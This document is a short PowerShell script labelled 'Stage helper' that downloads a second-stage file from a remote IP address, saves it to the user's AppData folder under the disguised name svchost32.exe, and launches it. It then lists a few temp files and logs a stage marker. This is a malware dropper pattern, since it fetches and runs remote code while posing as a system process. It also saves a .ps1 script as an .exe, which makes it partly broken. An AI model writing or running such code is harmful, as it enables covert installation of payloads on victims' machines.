
# Stage helper
$RemoteUrl = 'https://192.0.2.149/stage2.ps1'
$DropPath = "$env:APPDATA\svchost32.exe"
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath)
Start-Process -FilePath $DropPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 45 reached"
